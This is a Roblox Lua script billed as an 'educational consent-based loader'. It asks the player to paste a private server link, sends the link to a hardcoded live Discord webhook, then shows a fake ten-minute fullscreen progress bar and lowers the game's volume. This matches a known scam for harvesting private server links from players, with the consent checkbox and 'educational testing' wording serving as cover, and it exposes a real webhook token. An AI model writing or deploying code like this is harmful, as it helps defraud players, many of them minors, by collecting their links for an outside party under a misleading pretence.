-- Educational Consent-Based Loader
-- Fullscreen progress 0–100% (10 minutes)
-- Volume reduced locally
-- User MUST confirm consent

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")
local player = Players.LocalPlayer

-- 🔴 WEBHOOK (өөрийнхийгөө энд хийсэн байгаа)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1459228691719524423/2wshWHQe64lNdZ3IuwAEOVni6bLXiKmlQ_tIeorJOylviHrJk5cWtMGVVDGX58N-eApn"

-- ===== GUI ROOT =====
local gui = Instance.new("ScreenGui")
gui.Name = "ConsentLoaderGUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- ===== INPUT FRAME =====
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.fromScale(0.6, 0.45)
frame.Position = UDim2.fromScale(0.5, 0.5)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,16)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -20, 0, 50)
title.Position = UDim2.new(0, 10, 0, 10)
title.BackgroundTransparency = 1
title.Text = "Paste Your Private Server Link"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextScaled = true

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(1, -20, 0, 50)
box.Position = UDim2.new(0, 10, 0, 70)
box.PlaceholderText = "https://www.roblox.com/games/...privateServerLinkCode=XXXX"
box.Text = ""
box.ClearTextOnFocus = false
box.TextColor3 = Color3.new(1,1,1)
box.BackgroundColor3 = Color3.fromRGB(35,35,35)
box.Font = Enum.Font.Gotham
box.TextScaled = true
Instance.new("UICorner", box).CornerRadius = UDim.new(0,12)

-- ===== CONSENT BUTTON =====
local consentBtn = Instance.new("TextButton", frame)
consentBtn.Size = UDim2.new(1, -20, 0, 40)
consentBtn.Position = UDim2.new(0, 10, 0, 135)
consentBtn.Text = "[ ] I allow this link to be sent for educational testing"
consentBtn.TextColor3 = Color3.new(1,1,1)
consentBtn.BackgroundColor3 = Color3.fromRGB(30,30,30)
consentBtn.Font = Enum.Font.Gotham
consentBtn.TextScaled = true
Instance.new("UICorner", consentBtn).CornerRadius = UDim.new(0,10)

local agreed = false
consentBtn.MouseButton1Click:Connect(function()
    agreed = not agreed
    consentBtn.Text = agreed
        and "[✓] I allow this link to be sent for educational testing"
        or "[ ] I allow this link to be sent for educational testing"
end)

-- ===== BUTTONS =====
local submit = Instance.new("TextButton", frame)
submit.Size = UDim2.new(0.45, -10, 0, 40)
submit.Position = UDim2.new(0.05, 0, 1, -55)
submit.Text = "YES / START"
submit.BackgroundColor3 = Color3.fromRGB(0,170,255)
submit.TextColor3 = Color3.new(1,1,1)
submit.Font = Enum.Font.GothamBold
submit.TextScaled = true
Instance.new("UICorner", submit).CornerRadius = UDim.new(0,10)

local cancel = Instance.new("TextButton", frame)
cancel.Size = UDim2.new(0.45, -10, 0, 40)
cancel.Position = UDim2.new(0.5, 0, 1, -55)
cancel.Text = "CANCEL"
cancel.BackgroundColor3 = Color3.fromRGB(200,60,60)
cancel.TextColor3 = Color3.new(1,1,1)
cancel.Font = Enum.Font.GothamBold
cancel.TextScaled = true
Instance.new("UICorner", cancel).CornerRadius = UDim.new(0,10)

-- ===== FULLSCREEN PROGRESS =====
local full = Instance.new("Frame", gui)
full.Visible = false
full.Size = UDim2.fromScale(1,1)
full.BackgroundColor3 = Color3.fromRGB(10,10,10)

local percentText = Instance.new("TextLabel", full)
percentText.Size = UDim2.fromScale(1,0.2)
percentText.Position = UDim2.fromScale(0,0.35)
percentText.BackgroundTransparency = 1
percentText.Text = "0%"
percentText.TextColor3 = Color3.new(1,1,1)
percentText.Font = Enum.Font.GothamBold
percentText.TextScaled = true

local barBG = Instance.new("Frame", full)
barBG.Size = UDim2.fromScale(0.8,0.05)
barBG.Position = UDim2.fromScale(0.1,0.6)
barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
Instance.new("UICorner", barBG).CornerRadius = UDim.new(1,0)

local bar = Instance.new("Frame", barBG)
bar.Size = UDim2.fromScale(0,1)
bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)

-- ===== FUNCTIONS =====
local function sendWebhook(link)
    if not agreed or WEBHOOK_URL == "" then return end
    local data = {
        content = "Educational Test\nUser provided private server link:\n" .. link
    }
    pcall(function()
        HttpService:PostAsync(
            WEBHOOK_URL,
            HttpService:JSONEncode(data),
            Enum.HttpContentType.ApplicationJson
        )
    end)
end

local function startProgress()
    pcall(function()
        SoundService.Volume = 0.3
    end)

    local totalTime = 600 -- 10 minutes
    for i = 1, 100 do
        percentText.Text = i .. "%"
        bar.Size = UDim2.fromScale(i/100, 1)
        task.wait(totalTime / 100)
    end
    percentText.Text = "Completed"
end

-- ===== EVENTS =====
submit.MouseButton1Click:Connect(function()
    if box.Text == "" or not agreed then return end
    sendWebhook(box.Text)
    frame.Visible = false
    full.Visible = true
    task.spawn(startProgress)
end)

cancel.MouseButton1Click:Connect(function()
    gui:Destroy()
end)
